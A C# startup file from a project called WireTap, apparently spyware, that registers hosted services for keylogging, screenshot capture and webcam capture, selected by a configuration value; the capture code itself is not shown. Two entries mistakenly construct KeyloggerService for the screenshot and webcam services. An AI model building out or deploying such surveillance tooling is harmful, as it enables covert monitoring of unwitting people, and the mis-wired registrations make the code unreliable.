namespace WireTap.HostedService
{
    using Microsoft.Extensions.Configuration;
    using Microsoft.Extensions.DependencyInjection;
    using System;
    using System.Collections.Generic;
    using System.Diagnostics;
    using WireTap.Logging;

    public static class Startup
    {
        private static class ServiceRegistrar
        {
            public static Dictionary<string, Action<IServiceCollection>> ServiceRegistrations;

            static ServiceRegistrar()
            {
                ServiceRegistrations = new Dictionary<string, Action<IServiceCollection>>
                {
                    {  "keylogger", services => services.AddHostedService(_ => new KeyloggerService(LogManager.GetLogger<KeyloggerService>()))   },
                    { "screenshot", services => services.AddHostedService(_ => new KeyloggerService(LogManager.GetLogger<ScreenshotService>()))  },
                    {     "webcam", services => services.AddHostedService(_ => new KeyloggerService(LogManager.GetLogger<WebcamService>()))      }
                };
            }
        }

        public static IServiceCollection ConfigureServices(this IServiceCollection services, IConfiguration config)
        {
            var serviceName = config.GetValue<string>("ENVIRONMENT");
            services.AddHostedService(serviceName);
            services.AddSingleton(typeof(ILogger<>), typeof(Logger<>));

            return services;
        }

        public static IServiceCollection AddHostedService(this IServiceCollection services, string serviceName)
        {
            //if (Debugger.IsAttached)
            //{
                var serviceRegistration = ServiceRegistrar.ServiceRegistrations[serviceName];
                serviceRegistration(services);
            //}
            //else
            //{
            //    foreach (var registration in ServiceRegistrar.ServiceRegistrations)
            //        registration.Value(services);
            //}

            return services;
        }
    }
}